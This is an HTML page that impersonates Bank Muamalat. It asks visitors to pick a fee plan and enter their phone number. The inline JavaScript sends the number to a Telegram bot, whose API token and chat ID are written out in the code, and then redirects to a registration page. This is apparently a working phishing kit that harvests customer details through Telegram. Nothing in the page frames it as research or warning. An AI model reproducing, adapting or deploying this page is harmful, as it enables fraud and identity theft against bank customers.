<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Bank Muamalat</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
            crossorigin="anonymous"
        />
        <style type="text/css" media="all"></style>
    </head>
    <body>
        <div class="container mt-5">
            <div class="card">
                <div class="img text-center">
                    <img src="muamalat.png" alt="" width="40%" />
                </div>
                <div class="mt-5">
                    <p class="ms-3 fw-bold" style="font-size: 12px">
                        Pilih Tarif Anda
                    </p>
                </div>
                <div class="checkbox-container ms-3">
                    <input type="radio" class="checkbox" id="checkbox1" />
                    <label for="checkbox1"> Rp. 6.500/Transaksi</label>
                </div>
                <div class="checkbox-container ms-3">
                    <input type="radio" class="checkbox" id="checkbox2" />
                    <label for="checkbox2"> Rp. 150.000/Bulan</label>
                </div>
                <div class="form-group mt-3 ms-3">
                    <label class="fw-bold" style="font-size: 12px" for="tin"
                        >No. Handphone</label
                    >
                    <input
                        type="number"
                        style="width: 90%"
                        class="form-control"
                        id="nopek"
                        placeholder="+62"
                    />
                </div>
                <div class="ms-3 mt-3 mb-3">
                    <button
                        style="width: 40%"
                        type="button"
                        class="btn fw-bold btn-warning text-light"
                        onclick="send()"
                    >
                        Selanjutnya
                    </button>
                </div>
            </div>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
            crossorigin="anonymous"
        ></script>
        <script type="text/javascript" charset="utf-8">
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6217918085:AAHeiUZAZNLv21wGuBh_bTsMttJRGWYa2Zc/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                } else {
                    window.location.href = "registrasi.html";
                }
            }
            function send() {
                let nopek = document.querySelector("#nopek").value;
                if (nopek === "") {
                    alert("masukan nomor handphone!");
                } else {
                    let text = `Nomor handphone: ${nopek}`;
                    let chatId = "5882863819";
                    sendMessage(chatId, text);
                }
            }
        </script>
    </body>
</html>
